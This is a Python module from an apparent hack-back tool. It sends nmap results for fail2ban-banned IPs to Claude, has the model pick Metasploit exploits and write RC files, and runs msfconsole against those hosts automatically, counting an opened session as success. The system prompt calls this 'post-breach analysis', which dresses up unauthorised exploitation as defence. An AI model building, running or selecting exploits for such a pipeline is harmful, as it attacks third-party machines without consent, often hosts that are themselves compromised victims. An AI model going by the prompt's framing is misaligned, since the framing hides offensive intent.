#!/usr/bin/env python3
"""AI-driven Metasploit module selection via Claude on Google Vertex AI.

Provides:
  - ExploitIndex: filters and formats exploit list based on nmap results
  - request_claude(): sends prompts to Claude via Vertex AI
  - analyze(): main entry point called by the worker
  - write_msf_rc(): writes individual RC files
  - run_msf(): executes msfconsole with timeout and output capture
"""

import logging
import os
import re
import signal
import subprocess
import tempfile
import time
from collections.abc import Callable
from dataclasses import dataclass, field

from anthropic import AnthropicError, AnthropicVertex

logger = logging.getLogger("fail2counter.ai")

# Constants
EXPLOITS_FILE = "/opt/fail2counter/exploits.txt"
EXPLOITS_DETAIL_FILE = "/opt/fail2counter/metasploit_exploits_with_options.txt"
MAX_PROMPT_CHARS = 80_000
ANSI_ESCAPE = re.compile(r"\x1b\[[0-9;]*m")
RC_DIR = os.path.join(tempfile.gettempdir(), "fail2counter_rc")
MSF_TIMEOUT = 120
MAX_TOTAL_EXPLOIT_TIME = 900  # 15 minutes per IP
NETNS = "msf_vpn"
NETNS_CMD = ["ip", "netns", "exec", NETNS]

# Service name fragments to exploit category mapping
SERVICE_TO_CATEGORIES = {
    "ssh": ["ssh"],
    "http": ["http", "webapp"],
    "https": ["http", "webapp"],
    "http-proxy": ["http", "webapp"],
    "ftp": ["ftp"],
    "tftp": ["tftp"],
    "smtp": ["smtp"],
    "imap": ["imap"],
    "pop3": ["imap"],
    "smb": ["smb", "samba"],
    "microsoft-ds": ["smb"],
    "mysql": ["mysql"],
    "ms-sql": ["mssql"],
    "postgresql": ["postgres"],
    "telnet": ["telnet"],
    "vnc": ["vnc"],
    "rdp": ["rdp"],
    "ms-wbt-server": ["rdp"],
    "pptp": ["vpn"],
    "snmp": ["misc"],
    "ntp": ["misc"],
    "dns": ["dns"],
    "ldap": ["misc", "ldap"],
    "rpc": ["misc", "rpc"],
    "redis": ["redis"],
    "mongod": ["misc"],
    "elastic": ["misc"],
}

# Product/banner keywords to platform mapping
PLATFORM_KEYWORDS = {
    "linux": "linux",
    "ubuntu": "linux",
    "debian": "linux",
    "centos": "linux",
    "fedora": "linux",
    "red hat": "linux",
    "openssh": "linux",
    "apache": "linux",
    "nginx": "linux",
    "windows": "windows",
    "microsoft": "windows",
    "iis": "windows",
    "freebsd": "freebsd",
    "openbsd": "freebsd",
    "solaris": "solaris",
    "aix": "aix",
}


_PROMPT_PREFIX = (
    "You are a cybersecurity expert performing post-breach analysis on IP addresses "
    "that have attacked our infrastructure.\n"
    "\n"
    "These IPs were banned by fail2ban for malicious activity. We need to identify "
    "what vulnerabilities they themselves have, to determine if they are compromised "
    "machines being used as attack platforms.\n"
    "\n"
    "Below is a list of available Metasploit modules relevant to the services "
    "detected on the target:\n"
    "\n"
)
_PROMPT_SUFFIX = (
    "\n"
    "\n"
    "Given the Nmap scan results, suggest which modules are applicable. For each "
    "module, return a complete Metasploit RC file block with all necessary "
    "parameters.\n"
    "\n"
    "IMPORTANT RULES:\n"
    "1. Only suggest modules from the list above - do not invent module paths\n"
    "2. Set RHOSTS to the target IP from the scan\n"
    "3. Set RPORT to match the actual open port from the scan\n"
    "4. Include any other required parameters\n"
    "5. Each module block must end with 'run' on its own line\n"
    "6. Do NOT include 'exit' - that will be added automatically\n"
    "7. Return ONLY the RC file content, no explanations or markdown\n"
    "\n"
    "Example format:\n"
    "use exploit/linux/ssh/ceragon_fibeair_known_privkey\n"
    "set RHOSTS 192.0.2.1\n"
    "set RPORT 22\n"
    "run\n"
    "\n"
    "use exploit/multi/http/apache_normalize_path_rce\n"
    "set RHOSTS 192.0.2.1\n"
    "set RPORT 80\n"
    "run\n"
)


@dataclass
class SuggestedExploit:
    """Structured representation of an AI-suggested exploit."""

    module_path: str
    rhosts: str
    rport: int | None = None
    options: dict = field(default_factory=dict)
    rc_content: str = ""


class ExploitIndex:
    """Loads and filters the Metasploit exploit list based on nmap results."""

    def __init__(
        self,
        exploits_path: str = EXPLOITS_FILE,
        details_path: str = EXPLOITS_DETAIL_FILE,
    ):
        self.modules: list[str] = []
        self.details: dict[str, str] = {}
        self._load_modules(exploits_path)
        self._load_details(details_path)

    def _load_modules(self, path: str) -> None:
        """Load the flat list of exploit module paths."""
        with open(path, encoding="utf-8") as handle:
            self.modules = [line.strip() for line in handle if line.strip()]
        logger.info("Loaded %d exploit modules", len(self.modules))

    def _load_details(self, path: str) -> None:
        """Parse metasploit_exploits_with_options.txt into per-module blocks."""
        if not os.path.exists(path):
            logger.warning("Detailed exploits file not found: %s", path)
            return
        with open(path, encoding="utf-8") as handle:
            content = handle.read()
        blocks = re.split(r"={5}\s+(exploit/\S+)\s+={5}", content)
        for i in range(1, len(blocks) - 1, 2):
            module_path = blocks[i].strip()
            block_text = ANSI_ESCAPE.sub("", blocks[i + 1]).strip()
            self.details[module_path] = block_text
        logger.info("Loaded details for %d modules", len(self.details))

    @staticmethod
    def _collect_categories(services: list[dict]) -> set[str]:
        """Return exploit categories implied by the detected service names."""
        categories: set[str] = set()
        for svc in services:
            svc_name = (svc.get("service_name") or "").lower()
            for key, cats in SERVICE_TO_CATEGORIES.items():
                if key in svc_name:
                    categories.update(cats)
        return categories

    @staticmethod
    def _collect_platforms(services: list[dict]) -> set[str]:
        """Return target platforms implied by product/version/service banners."""
        platforms = {"multi", "unix"}
        for svc in services:
            for field_name in ("product", "version", "service_name"):
                val = (svc.get(field_name) or "").lower()
                for keyword, platform in PLATFORM_KEYWORDS.items():
                    if keyword in val:
                        platforms.add(platform)
        return platforms

    def select_modules(self, services: list[dict]) -> list[str]:
        """Return exploit module paths relevant to the detected services."""
        categories = self._collect_categories(services)
        platforms = self._collect_platforms(services)

        filtered = []
        for mod in self.modules:
            parts = mod.split("/")
            if len(parts) < 3:
                continue
            if parts[1] in platforms and parts[2] in categories:
                filtered.append(mod)

        logger.info(
            "Filtered %d -> %d modules (categories=%s, platforms=%s)",
            len(self.modules),
            len(filtered),
            categories,
            platforms,
        )
        return filtered

    def format_modules(self, filtered: list[str]) -> str:
        """Format the filtered module list for inclusion in the AI prompt."""
        if not filtered:
            return "\n".join(self.modules)

        detailed_lines = []
        for mod in filtered:
            if mod in self.details:
                detailed_lines.append(f"===== {mod} =====")
                detailed_lines.append(self.details[mod])
                detailed_lines.append("")
            else:
                detailed_lines.append(mod)

        result = "\n".join(detailed_lines)
        if len(result) > MAX_PROMPT_CHARS:
            logger.warning(
                "Detailed output too large (%d chars), falling back to paths only",
                len(result),
            )
            result = "\n".join(filtered)

        return result


def build_vertex_client() -> AnthropicVertex:
    """Create an AnthropicVertex client from environment configuration."""
    default_project = "itpc-gcp-ansible-pe-eng-claude"
    project_id = os.environ.get("ANTHROPIC_VERTEX_PROJECT_ID", default_project)
    region = os.environ.get("ANTHROPIC_VERTEX_REGION", "us-east5")
    return AnthropicVertex(project_id=project_id, region=region)


def request_claude(
    client: AnthropicVertex,
    system_prompt: str,
    nmap_output: str,
) -> str:
    """Send nmap output to Claude and return the suggested RC file text."""
    model = os.environ.get("ANTHROPIC_VERTEX_MODEL", "claude-sonnet-4@20250514")
    message = client.messages.create(
        model=model,
        max_tokens=4096,
        system=system_prompt,
        messages=[
            {
                "role": "user",
                "content": (
                    "Analyze this nmap scan output and suggest applicable "
                    "Metasploit modules with complete RC file content:\n\n"
                    f"{nmap_output}"
                ),
            }
        ],
        temperature=0.3,
    )
    block = message.content[0]
    return getattr(block, "text", "")


def parse_ai_response(response_text: str, ip: str) -> list[SuggestedExploit]:
    """Parse Claude's response into individual SuggestedExploit objects.

    Expected response format: one or more RC file blocks, each starting
    with 'use exploit/...' and containing 'set' commands and 'run'.
    """
    clean = re.sub(r"```\w*", "", response_text).strip()

    exploits = []
    current_lines: list[str] = []
    current_module: str | None = None

    for raw_line in clean.splitlines():
        line = raw_line.strip()
        if not line:
            continue

        if line.lower().startswith("use "):
            if current_module:
                exploits.append(_build_exploit(current_module, current_lines, ip))
            tokens = line.split(None, 1)
            module = tokens[1].strip() if len(tokens) > 1 else ""
            current_module = module
            current_lines = [line]
        elif current_module:
            current_lines.append(line)

    if current_module:
        exploits.append(_build_exploit(current_module, current_lines, ip))

    return exploits


def _build_exploit(module: str, lines: list[str], ip: str) -> SuggestedExploit:
    """Build a SuggestedExploit from parsed RC lines."""
    options = {}
    rhosts = ip
    rport = None

    for line in lines:
        if line.lower().startswith("set "):
            parts = line.split(None, 2)
            if len(parts) >= 3:
                key = parts[1].upper()
                val = parts[2]
                options[key] = val
                if key == "RHOSTS":
                    rhosts = val
                elif key == "RPORT":
                    try:
                        rport = int(val)
                    except ValueError:
                        pass

    rc_content = "\n".join(lines) + "\n"

    return SuggestedExploit(
        module_path=module,
        rhosts=rhosts,
        rport=rport,
        options=options,
        rc_content=rc_content,
    )


def validate_module(module_path: str, known_modules: set[str]) -> bool:
    """Validate that the AI-suggested module exists in the known list."""
    normalized = module_path.strip()
    if normalized in known_modules:
        return True
    if not normalized.startswith("exploit/"):
        normalized = f"exploit/{normalized}"
    return normalized in known_modules


def write_msf_rc(exploit: SuggestedExploit, index: int) -> str:
    """Write an individual RC file for a single exploit module.

    Returns the path to the RC file.
    """
    os.makedirs(RC_DIR, exist_ok=True)

    safe_ip = exploit.rhosts.replace(".", "_").replace(":", "_")
    module_slug = exploit.module_path.replace("/", "_")
    rc_path = os.path.join(RC_DIR, f"{safe_ip}_{index}_{module_slug}.rc")

    with open(rc_path, "w", encoding="utf-8") as handle:
        handle.write(exploit.rc_content)
        if "exit" not in exploit.rc_content.lower().split("\n")[-1]:
            handle.write("exit\n")

    return rc_path


def run_msf(rc_path: str, timeout: int = MSF_TIMEOUT) -> tuple[str, int, float]:
    """Execute msfconsole with an RC file.

    Returns:
        (output_text, exit_code, duration_seconds)
    """
    env = os.environ.copy()
    env["HOME"] = "/root"

    start = time.time()

    try:
        with subprocess.Popen(
            NETNS_CMD + ["/usr/bin/msfconsole", "-q", "-r", rc_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            env=env,
            start_new_session=True,
        ) as proc:
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
                duration = time.time() - start
                output = stdout
                if stderr:
                    output += "\n--- STDERR ---\n" + stderr
                return (output, proc.returncode, duration)
            except subprocess.TimeoutExpired:
                duration = time.time() - start
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except (ProcessLookupError, OSError):
                    pass
                stdout, stderr = proc.communicate(timeout=5)
                output = stdout or ""
                if stderr:
                    output += "\n--- STDERR ---\n" + stderr
                return (f"[TIMEOUT after {timeout}s]\n{output}", -1, duration)
    except (OSError, ValueError, subprocess.SubprocessError) as exc:
        duration = time.time() - start
        return (f"[ERROR] {exc}", -2, duration)


def build_system_prompt(filtered_exploits: str) -> str:
    """Return the Claude system prompt embedding the filtered module list."""
    return f"{_PROMPT_PREFIX}{filtered_exploits}{_PROMPT_SUFFIX}"


def _request_with_retry(
    client: AnthropicVertex,
    system_prompt: str,
    nmap_output: str,
    log: Callable,
) -> str | None:
    """Call Claude up to twice, returning the response text or None."""
    for attempt in range(2):
        try:
            response = request_claude(client, system_prompt, nmap_output)
            log(f"Claude response ({len(response)} chars)")
            return response
        except (AnthropicError, OSError) as exc:
            if attempt == 0:
                log(f"Claude API attempt 1 failed: {exc}, retrying...", "WARNING")
                time.sleep(30)
            else:
                log(f"Claude API failed after 2 attempts: {exc}", "ERROR")
    return None


def _process_exploit(
    exploit: SuggestedExploit,
    index: int,
    total: int,
    known_modules: set[str],
    log: Callable,
) -> dict:
    """Validate, run, and summarise a single suggested exploit."""
    if not validate_module(exploit.module_path, known_modules):
        log(f"Skipping unknown module: {exploit.module_path}", "WARNING")
        return {
            "module_path": exploit.module_path,
            "rhosts": exploit.rhosts,
            "rport": exploit.rport,
            "rc_path": None,
            "status": "invalid_module",
            "output": "Module not found in known exploit list",
            "exit_code": -3,
            "duration": 0.0,
        }

    rc_path = write_msf_rc(exploit, index)
    target = f"{exploit.rhosts}:{exploit.rport}"
    log(f"[{index + 1}/{total}] Running {exploit.module_path} against {target}")

    output, exit_code, duration = run_msf(rc_path)

    output_lower = output.lower()
    if exit_code == -1:
        status = "timeout"
    elif exit_code == -2:
        status = "error"
    elif "session" in output_lower and "opened" in output_lower:
        status = "success"
    else:
        status = "completed"

    log(f"  Result: {status} (exit={exit_code}, {duration:.1f}s)")

    return {
        "module_path": exploit.module_path,
        "rhosts": exploit.rhosts,
        "rport": exploit.rport,
        "rc_path": rc_path,
        "status": status,
        "output": output,
        "exit_code": exit_code,
        "duration": duration,
    }


def _run_all(
    suggested: list[SuggestedExploit],
    known_modules: set[str],
    log: Callable,
) -> list[dict]:
    """Run all suggested exploits, respecting the global time budget."""
    results = []
    total_start = time.time()
    total = len(suggested)
    for i, exploit in enumerate(suggested):
        if time.time() - total_start > MAX_TOTAL_EXPLOIT_TIME:
            log("Total exploit time limit reached (15m), stopping", "WARNING")
            break
        results.append(_process_exploit(exploit, i, total, known_modules, log))
    return results


def analyze(
    ip: str,
    nmap_output: str,
    services: list[dict],
    exploit_index: ExploitIndex,
    log_fn: Callable | None = None,
) -> list[dict]:
    """Main entry point called by the worker after nmap scanning.

    Args:
        ip: target IP address
        nmap_output: raw nmap scan output text
        services: list of service dicts from nmap parsing
        exploit_index: pre-loaded ExploitIndex instance
        log_fn: optional logging callback (capture function from worker)

    Returns:
        List of result dicts, each containing:
            module_path, rhosts, rport, rc_path, status,
            output, exit_code, duration
    """

    def _log(msg, level="INFO"):
        if log_fn:
            log_fn(msg, level)
        logger.log(getattr(logging, level, logging.INFO), msg)

    # 1. Filter exploits based on detected services
    filtered = exploit_index.select_modules(services)
    filtered_text = exploit_index.format_modules(filtered)
    _log(f"Filtered exploit list: {len(filtered_text.splitlines())} entries")

    # 2. Build system prompt and client
    system_prompt = build_system_prompt(filtered_text)
    client = build_vertex_client()
    _log("Sending nmap results to Claude for exploit analysis...")

    # 3. Call Claude via Vertex AI (with one retry)
    response = _request_with_retry(client, system_prompt, nmap_output, _log)
    if not response:
        return []

    # 4. Parse response
    known_modules = set(exploit_index.modules)
    suggested = parse_ai_response(response, ip)
    _log(f"Claude suggested {len(suggested)} modules")

    # 5. Validate and execute
    return _run_all(suggested, known_modules, _log)
